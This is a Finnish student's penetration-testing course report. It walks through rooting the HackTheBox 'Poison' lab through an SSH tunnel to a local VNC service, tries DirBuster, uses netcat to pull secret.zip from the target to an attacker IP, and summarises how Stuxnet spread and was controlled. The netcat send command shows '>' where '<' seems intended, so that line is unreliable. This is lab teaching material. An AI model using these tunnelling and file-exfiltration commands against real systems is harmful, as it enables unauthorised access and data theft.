Penetration Testing Course – ict4tn027-3001  
Haaga-Helia  
Opettaja: [Tero Karvinen](http://terokarvinen.com/2018/penetration-testing-course-autumn-2018)  

1) Korkkaa Poison. Jos et pääse root shelliin asti, kuvaile, mihin pääsit ja mitä johtolankoja jäi tutkimatta.

2) CTF walktrough. Katso Youtubesta jokin CTF walktrough (muu kuin HackTheBox). Mitä opit, mitä ideoita sait? Kokeile vähintään kolmea itsellesi uutta työkalua, joita opit videosta.

3) Stuxnet. Lue artikkeli Stuxnetista, esim. Symantec tai Langer. Voit hakea ‘stuxnet analysis’. 1) Miten Stuxnet murtautui koneille? Yleisluontoinen vastaus (mikä hyökkäys millekin käyttöjärjestelmälle mihin komponenttiin) riittää, koska nämä hyökkäykset ovat jo vanhentuneet. 2) Miten ohjaus (command and control, C2) toimi? 3) Miten Stuxnet ylitti ilmaraon (air gap)?

# Tehtävä 1 #

Jäin viimekerralla siihen, että olin tuonut SFTP:n avulla Poisonista omalle koneelleni *Secrey.zip* -tiedoston ja avannut sen. Ehdin vähän aikaa pällistellä sen sisältöä, mutta en vielä keksinyt mihin voisin kyseistä tiedostoa käyttää.  
`��[|Ֆz!`  

En ole törmännyt vastaavaan ennen ja tuskin pääsen sisään käyttämättä apunani jotain *walkthrough* -ohjetta.  
Katsoin yhden vinkin. `sockstat -l` komennolla näin käynnissä olevia prosesseja, niiden käyttäjät, portit yms.  
```
charix@Poison:~ % sockstat -l
USER     COMMAND    PID   FD PROTO  LOCAL ADDRESS         FOREIGN ADDRESS      
www      httpd      3362  3  tcp6   *:80                  *:*
www      httpd      3362  4  tcp4   *:80                  *:*
www      httpd      3279  3  tcp6   *:80                  *:*
www      httpd      3279  4  tcp4   *:80                  *:*
www      httpd      3261  3  tcp6   *:80                  *:*
www      httpd      3261  4  tcp4   *:80                  *:*
www      httpd      3250  3  tcp6   *:80                  *:*
www      httpd      3250  4  tcp4   *:80                  *:*
www      httpd      3242  3  tcp6   *:80                  *:*
www      httpd      3242  4  tcp4   *:80                  *:*
www      httpd      3237  3  tcp6   *:80                  *:*
www      httpd      3237  4  tcp4   *:80                  *:*
www      httpd      3216  3  tcp6   *:80                  *:*
www      httpd      3216  4  tcp4   *:80                  *:*
www      httpd      3205  3  tcp6   *:80                  *:*
www      httpd      3205  4  tcp4   *:80                  *:*
www      httpd      3186  3  tcp6   *:80                  *:*
www      httpd      3186  4  tcp4   *:80                  *:*
www      httpd      3185  3  tcp6   *:80                  *:*
www      httpd      3185  4  tcp4   *:80                  *:*
charix   Xvnc       3119  0  tcp4   *:6005                *:*
charix   Xvnc       3119  1  stream /tmp/.X11-unix/X5
charix   Xvnc       3119  3  tcp4   *:5905                *:*
charix   Xvnc       3119  4  tcp4   *:5805                *:*
charix   Xvnc       3066  0  tcp4   *:6004                *:*
charix   Xvnc       3066  1  stream /tmp/.X11-unix/X4
charix   Xvnc       3066  3  tcp4   *:5904                *:*
charix   Xvnc       3066  4  tcp4   *:5804                *:*
charix   Xvnc       3036  0  tcp4   *:6003                *:*
charix   Xvnc       3036  1  stream /tmp/.X11-unix/X3
charix   Xvnc       3036  3  tcp4   *:5903                *:*
charix   Xvnc       3036  4  tcp4   *:5803                *:*
charix   Xvnc       2426  0  tcp4   *:6002                *:*
charix   Xvnc       2426  1  stream /tmp/.X11-unix/X2
charix   Xvnc       2426  3  tcp4   *:5902                *:*
charix   Xvnc       2426  4  tcp4   *:5802                *:*
root     sendmail   650   3  tcp4   127.0.0.1:25          *:*
root     httpd      633   3  tcp6   *:80                  *:*
root     httpd      633   4  tcp4   *:80                  *:*
root     sshd       620   3  tcp6   *:22                  *:*
root     sshd       620   4  tcp4   *:22                  *:*
root     Xvnc       529   0  stream /tmp/.X11-unix/X1
root     Xvnc       529   1  tcp4   127.0.0.1:5901        *:*
root     Xvnc       529   3  tcp4   127.0.0.1:5801        *:*
root     syslogd    390   4  dgram  /var/run/log
root     syslogd    390   5  dgram  /var/run/logpriv
root     syslogd    390   6  udp6   *:514                 *:*
root     syslogd    390   7  udp4   *:514                 *:*
root     devd       319   4  stream /var/run/devd.pipe
root     devd       319   5  seqpac /var/run/devd.seqpacket.pipe

```
Tältä listalta houkuttelevia prosesseja ovat ne joita ajaa **root**. Pienen googlailun jälkeen kiinnostavin protokolla on *Xvnc*, joka ilmeisesti kielii toisesta serveristä serverin sisällä. Laitetaan portit 5901 ja 5801 ylös. Nopea tutustuminen VNC protokollaan ei juurikaan anna minulle avaimia yhteyden avaamiseen. Katsoin seuraavan vinkin *Walkthrough* sivulta, joka ohjaa minut osoitteeseen http://www.hackingarticles.in/comprehensive-guide-to-ssh-tunnelling/.  

Viimeinen ratkaisu:  
`ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84`  
`vncviewer -passwd secret 127.0.0.1:5901`  
`cat root.txt`  
En olisi luultavasti päässyt loppuun asti ilman vinkkejä ja suoraa apua ohjeesta, mutta ensi kerta on toivottavasti helpompi kun työkalut tulevat pikkuhiljaa tutuiksi!

# Tehtävä 2 #

Etsin Youtubesta CTF walkthrough [videon](https://www.youtube.com/watch?v=CuBX3sBeGSw), jossa esitellään murtautumista koneeseen nimeltään [derpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/). Videon kuvauksen mukaan kyseessä on melko helppo kohde.  

**Uusia työkaluja videolta:**  
**[OWASP DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)**  
"DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. Often is the case now of what looks like a web server in a state of default installation is actually not, and has pages and applications hidden within. DirBuster attempts to find these."  
Kuulostaa ohjelmalta, jolle varmasti löytyy käyttöä tulevaisuudessa. En ole ratkaissut Poisonia vielä loppuun asti (*teen osittain tehtävän 2 ennen tehtävää 1*), joten voisin ratkoa sitä alusta asti omalla virtuaalikoneellani käyttäen hieman eri työkaluja.

**Asennus**
1. Latasin [DirBuster Jar -tiedoston](http://downloads.sourceforge.net/dirbuster/DirBuster-0.12.tar.bz2?use_mirror=osdn)  
2. Paketin purku ja käyttö:  
```
cd Downloads
tar xvjf DirBuster-0.12.tar.bz2
cd DirBuster-0.12/
java -jar DirBuster-0.12.jar
```
(tar -tiedoston purkuun hyvät [ohjeet](https://www.hostingadvice.com/how-to/untar-file-linuxubuntu/))

`java -jar DirBuster-0.12.jar` siis suorittaa ohjelman. **Huom**, se ei avannut graafista ikkunaa Puttyllä, vaan jouduin käyttämään VirtualBoxin terminaalia että sain interfacen käyttööni.  
![Buster_DL](https://i.imgur.com/whON9lZ.png)  

Osoitteeksi laitin Poisonin IP:n ja halutun portin: *http://10.10.10.84:80*  
Browse -painikkeesta pääsin suoraan valitsemaan listan mitä käyttää skannauksessa. Valitsin *directory-list-lowercase.2.3-small.txt*  
![DirBust](https://i.imgur.com/nyZ7UDA.png)  

Skannauksen loputtua näin tulokset suoraan ja pystyin *Report* -painikkeesta luomaan *txt* -tiedoston tuloksista haluamaani paikkaan.  
![DirBusted](https://i.imgur.com/uLvRCxv.png)

![BusteReport](https://i.imgur.com/ftp0qrp.png)

Toivoin että DirBuster olisi kertonut hieman enemmän, mutta ehkä Poison on tämän ohjelman testaamiseen huono maali, koska se ilmoittaa omilla verkkosivuillaan avoinna olevat sivut. Jos maalikone ei jakaisi tietoa niin anteliaasti, olisi DirBusterin anti paljon arvokkaampaa. Tähän päättyy tämän ohjelman testaus.  


**[Netcat](https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections-on-a-vps)**  

Koitan kerrata Poisonin korkkausta uusilla työkaluilla, joten tehdään jotain myös Netcatin avulla. Aiemmin tällä viikolla murtauduin Poisoniin ja *secret.zip* -tiedoston omalle koneelleni SFTP:n avulla. Komento taisi olla `sftp ssh charix@10.10.10.84` ellen väärin muista.  
Kokeillaan tehdä sama asia Netcatilla. Ensiksi laitin oman koneeni kuuntelemaan porttia 1337 ja nimeämään vastaanotetun tiedoston:  
`nc -l -p 1337 > secret.zip`  
Seuraavaksi pyrin lähettämään tiedoston Poisonista. Käyttö-oikeudet ilmeisesti paukkuivat, joten siirryin */tmp* -kansioon, johon olin aikeissa tuodo *secret.zip* -tiedoston, mutta se löytyi sieltä jo valmiiksi. Siellä ajoin komennon:  
`nc 10.10.13.63 1337 > secret.zip`  

Aikaa kului noin sekunti ja tiedosto tuli perille!  
![Netcat](https://i.imgur.com/ewfoweY.png)


**Hashcat**  
En tiedä pääsenkö välittömästi kokeilemaan kyseistä ohjelmaa, mutta varmasti törmään maalikoneiden parissa tilanteeseen jossa sille on käyttöä. Työkalun avulla käännetään hashista selkokielinen salasana.


# Tehtävä 3 #

Stuxnet. Lue artikkeli Stuxnetista, esim. Symantec tai Langer. Voit hakea ‘stuxnet analysis’.

1) **Miten Stuxnet murtautui koneille? Yleisluontoinen vastaus (mikä hyökkäys millekin**  
Stuxnet päätyi kohdejärjestelmään ensin flash driven kautta. Se asentaa itsensä kohdekoneelle. Madon kohteessa käytettiin windowsia, joten Stuxnet sisältää windows rootkitin, jonka avulla se saa tarvitsemansa käyttöoikeudet ja voi toimia huomaamatta.  
Stuxnet leviää verkossa liitettyjen laitteiden kautta (esim. printteri).

2) **Miten ohjaus (command and control, C2) toimi?** 
Stuxnet yrittää ottaa salatun yhteyden kahteen eri URL:iin testatakseen yhteyttään.  Nämä URL:it kuuluvat serveriin joka toimii ohjauksena (Command & Control). Serverille lähetetään tietoja, kuten Windows versio, tietokoneen nimi, verkon nimi ja IP-osoite.
Ohjaus lähettää yhden kahden tyypin vastauksista. Joko se käskee matoa suorittamaan toiminnon joka on jo sisäänrakennettu koodiin, tai se lähettää *.dll-tiedoston*, joka sisältää uusia toimintoja. Ohjaus voi komentaa matoa lukemaan, kirjoittamaan tai poistamaan tiedostoja, luomaan prosesseja ja vastaanottamaan päivityksiä omaan konfiguraatioonsa.

3) **Miten Stuxnet ylitti ilmaraon (air gap)?**  
Iranin ydinjalostamo, joka oli Stuxnetin kohde, ei ollut kytkettynä internettiin, joten ilmarako tuli ylittää kuljettamalla sisälle haittaohjelman sisältäviä USB-tikkuja. Tämän tekivät joko agentit tai tietämättömät työntekijät.

